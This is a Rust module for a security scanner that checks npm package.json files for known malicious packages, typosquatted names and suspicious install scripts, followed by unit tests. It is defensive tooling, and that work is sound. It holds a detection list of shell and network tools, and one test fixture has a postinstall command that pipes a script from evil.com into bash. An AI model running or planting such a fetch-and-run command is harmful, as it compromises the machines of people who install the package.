//! Dependency scanning for npm packages.
//!
//! This module provides analysis of package.json files to detect:
//! - Known malicious packages from past npm supply chain attacks
//! - Typosquatting attempts (packages with names similar to popular packages)
//! - Suspicious install scripts
//! - Deprecated packages with known vulnerabilities

pub mod malicious;
pub mod typosquat;

use crate::types::{Finding, FindingCategory, Location, ScanResult, Severity};
use anyhow::Result;
use serde::Deserialize;
use std::collections::HashMap;
use std::path::Path;
use std::time::Instant;

pub use malicious::{MaliciousPackage, MaliciousPackageDb};
pub use typosquat::TyposquatDetector;

/// Configuration for dependency analysis.
#[derive(Debug, Clone)]
pub struct DependencyAnalyzerConfig {
    /// Enable typosquatting detection.
    pub check_typosquat: bool,
    /// Enable install script detection.
    pub check_install_scripts: bool,
    /// Maximum Levenshtein distance for typosquat detection.
    pub typosquat_threshold: usize,
}

impl Default for DependencyAnalyzerConfig {
    fn default() -> Self {
        Self {
            check_typosquat: true,
            check_install_scripts: true,
            typosquat_threshold: 2,
        }
    }
}

/// Parsed package.json structure.
#[derive(Debug, Deserialize)]
struct PackageJson {
    #[allow(dead_code)]
    name: Option<String>,
    #[allow(dead_code)]
    version: Option<String>,
    #[serde(default)]
    dependencies: HashMap<String, String>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: HashMap<String, String>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: HashMap<String, String>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: HashMap<String, String>,
    #[serde(default)]
    scripts: HashMap<String, String>,
}

/// Dependency analyzer for npm packages.
pub struct DependencyAnalyzer {
    config: DependencyAnalyzerConfig,
    malicious_db: MaliciousPackageDb,
    typosquat_detector: TyposquatDetector,
}

impl DependencyAnalyzer {
    /// Create a new dependency analyzer with default configuration.
    pub fn new() -> Result<Self> {
        Self::with_config(DependencyAnalyzerConfig::default())
    }

    /// Create a dependency analyzer with custom configuration.
    pub fn with_config(config: DependencyAnalyzerConfig) -> Result<Self> {
        let malicious_db = MaliciousPackageDb::load_builtin();
        let typosquat_detector = TyposquatDetector::new(config.typosquat_threshold);

        Ok(Self {
            config,
            malicious_db,
            typosquat_detector,
        })
    }

    /// Analyze a package.json file for security issues.
    pub fn analyze_file(&self, path: &Path) -> Result<ScanResult> {
        let start = Instant::now();
        let mut result = ScanResult::new(path.to_path_buf());

        // Read and parse package.json
        let content = std::fs::read_to_string(path)?;
        let package: PackageJson = serde_json::from_str(&content)?;

        // Collect all dependencies
        let mut all_deps: Vec<(&str, &str, &str)> = Vec::new();

        for (name, version) in &package.dependencies {
            all_deps.push((name, version, "dependencies"));
        }
        for (name, version) in &package.dev_dependencies {
            all_deps.push((name, version, "devDependencies"));
        }
        for (name, version) in &package.peer_dependencies {
            all_deps.push((name, version, "peerDependencies"));
        }
        for (name, version) in &package.optional_dependencies {
            all_deps.push((name, version, "optionalDependencies"));
        }

        // Check each dependency
        for (name, version, dep_type) in &all_deps {
            // Check against malicious package database
            if let Some(malicious) = self.malicious_db.lookup(name, version) {
                result.findings.push(self.create_malicious_finding(
                    path,
                    name,
                    version,
                    dep_type,
                    malicious,
                    &content,
                ));
            }

            // Check for typosquatting
            if self.config.check_typosquat {
                if let Some((popular_name, distance)) = self.typosquat_detector.check(name) {
                    result.findings.push(self.create_typosquat_finding(
                        path,
                        name,
                        version,
                        dep_type,
                        &popular_name,
                        distance,
                        &content,
                    ));
                }
            }
        }

        // Check for suspicious install scripts
        if self.config.check_install_scripts {
            result
                .findings
                .extend(self.check_install_scripts(path, &package, &content));
        }

        result.scan_time_ms = start.elapsed().as_millis() as u64;
        Ok(result)
    }

    /// Create a finding for a known malicious package.
    fn create_malicious_finding(
        &self,
        path: &Path,
        name: &str,
        version: &str,
        dep_type: &str,
        malicious: &MaliciousPackage,
        content: &str,
    ) -> Finding {
        let line = find_line_number(content, name);
        let severity = match malicious.severity.as_str() {
            "critical" => Severity::Critical,
            "high" => Severity::High,
            "medium" => Severity::Medium,
            _ => Severity::High,
        };

        let mut finding = Finding::new(
            "DEP-MALICIOUS-001",
            format!("Known malicious package: {}", name),
            format!(
                "Package '{}@{}' in {} is known to be malicious. {}",
                name, version, dep_type, malicious.reason
            ),
            severity,
            FindingCategory::SuspiciousDependency,
            Location::new(path.to_path_buf(), line, line),
            format!("\"{}\": \"{}\"", name, version),
        )
        .with_remediation("Remove this package immediately and audit your system for compromise.")
        .with_metadata("package", name.to_string())
        .with_metadata("version", version.to_string())
        .with_metadata("dep_type", dep_type.to_string());

        if let Some(ref cve) = malicious.cve {
            finding = finding.with_metadata("cve", cve.clone());
        }

        if let Some(ref reference) = malicious.reference {
            finding = finding.with_metadata("reference", reference.clone());
        }

        finding
    }

    /// Create a finding for potential typosquatting.
    fn create_typosquat_finding(
        &self,
        path: &Path,
        name: &str,
        version: &str,
        dep_type: &str,
        popular_name: &str,
        distance: usize,
        content: &str,
    ) -> Finding {
        let line = find_line_number(content, name);

        Finding::new(
            "DEP-TYPOSQUAT-001",
            format!("Potential typosquatting: {}", name),
            format!(
                "Package '{}' in {} is suspiciously similar to popular package '{}' \
                (edit distance: {}). This could be a typosquatting attack.",
                name, dep_type, popular_name, distance
            ),
            Severity::High,
            FindingCategory::SuspiciousDependency,
            Location::new(path.to_path_buf(), line, line),
            format!("\"{}\": \"{}\"", name, version),
        )
        .with_remediation(format!(
            "Verify you intended to install '{}' and not '{}'. \
            If this is intentional, you can ignore this warning.",
            name, popular_name
        ))
        .with_metadata("package", name.to_string())
        .with_metadata("similar_to", popular_name.to_string())
        .with_metadata("edit_distance", distance.to_string())
    }

    /// Check for suspicious install scripts.
    fn check_install_scripts(
        &self,
        path: &Path,
        package: &PackageJson,
        content: &str,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Suspicious script patterns
        let dangerous_patterns = [
            ("curl ", "Downloads external content"),
            ("wget ", "Downloads external content"),
            ("nc ", "Netcat - potential reverse shell"),
            ("bash -c", "Executes arbitrary bash commands"),
            ("sh -c", "Executes arbitrary shell commands"),
            ("eval ", "Executes arbitrary code"),
            ("node -e", "Executes inline Node.js code"),
            ("|", "Piped command execution"),
            (">/dev/null", "Suppresses output (hiding activity)"),
            ("2>&1", "Redirects stderr (hiding errors)"),
            ("base64", "Base64 encoding/decoding (obfuscation)"),
            ("$(",  "Command substitution"),
            ("exec(", "Code execution"),
        ];

        let install_scripts = ["preinstall", "install", "postinstall"];

        for script_name in &install_scripts {
            if let Some(script_content) = package.scripts.get(*script_name) {
                for (pattern, description) in &dangerous_patterns {
                    if script_content.to_lowercase().contains(&pattern.to_lowercase()) {
                        let line = find_line_number(content, script_name);

                        findings.push(
                            Finding::new(
                                "DEP-SCRIPT-001",
                                format!("Suspicious {} script", script_name),
                                format!(
                                    "The {} script contains suspicious pattern '{}': {}. \
                                    Install scripts can execute arbitrary code when you run npm install.",
                                    script_name, pattern, description
                                ),
                                Severity::High,
                                FindingCategory::ShellExecution,
                                Location::new(path.to_path_buf(), line, line),
                                format!("\"{}\": \"{}\"", script_name, truncate(script_content, 100)),
                            )
                            .with_remediation(
                                "Review the install script carefully. \
                                Consider using --ignore-scripts during installation.",
                            )
                            .with_metadata("script", script_name.to_string())
                            .with_metadata("pattern", pattern.to_string()),
                        );
                        break; // One finding per script
                    }
                }
            }
        }

        findings
    }
}

impl Default for DependencyAnalyzer {
    fn default() -> Self {
        Self::new().expect("Failed to create default dependency analyzer")
    }
}

/// Find the line number where a string appears in content.
fn find_line_number(content: &str, needle: &str) -> usize {
    for (i, line) in content.lines().enumerate() {
        if line.contains(needle) {
            return i + 1;
        }
    }
    1
}

use crate::types::truncate;

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    fn create_package_json(content: &str) -> NamedTempFile {
        let mut file = tempfile::Builder::new()
            .suffix(".json")
            .tempfile()
            .unwrap();
        write!(file, "{}", content).unwrap();
        file
    }

    #[test]
    fn test_detect_malicious_package() {
        let analyzer = DependencyAnalyzer::new().unwrap();
        let file = create_package_json(
            r#"{
                "name": "test",
                "dependencies": {
                    "event-stream": "3.3.6"
                }
            }"#,
        );

        let result = analyzer.analyze_file(file.path()).unwrap();
        assert!(!result.findings.is_empty());
        assert!(result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEP-MALICIOUS-001"));
    }

    #[test]
    fn test_detect_typosquat() {
        let analyzer = DependencyAnalyzer::new().unwrap();
        let file = create_package_json(
            r#"{
                "name": "test",
                "dependencies": {
                    "loadsh": "4.0.0"
                }
            }"#,
        );

        let result = analyzer.analyze_file(file.path()).unwrap();
        assert!(!result.findings.is_empty());
        assert!(result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEP-TYPOSQUAT-001"));
    }

    #[test]
    fn test_detect_suspicious_script() {
        let analyzer = DependencyAnalyzer::new().unwrap();
        let file = create_package_json(
            r#"{
                "name": "test",
                "scripts": {
                    "postinstall": "curl https://evil.com/payload.sh | bash"
                }
            }"#,
        );

        let result = analyzer.analyze_file(file.path()).unwrap();
        assert!(!result.findings.is_empty());
        assert!(result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEP-SCRIPT-001"));
    }

    #[test]
    fn test_safe_package() {
        let analyzer = DependencyAnalyzer::new().unwrap();
        let file = create_package_json(
            r#"{
                "name": "test",
                "dependencies": {
                    "lodash": "4.17.21",
                    "express": "4.18.2"
                }
            }"#,
        );

        let result = analyzer.analyze_file(file.path()).unwrap();
        assert!(result.findings.is_empty());
    }
}
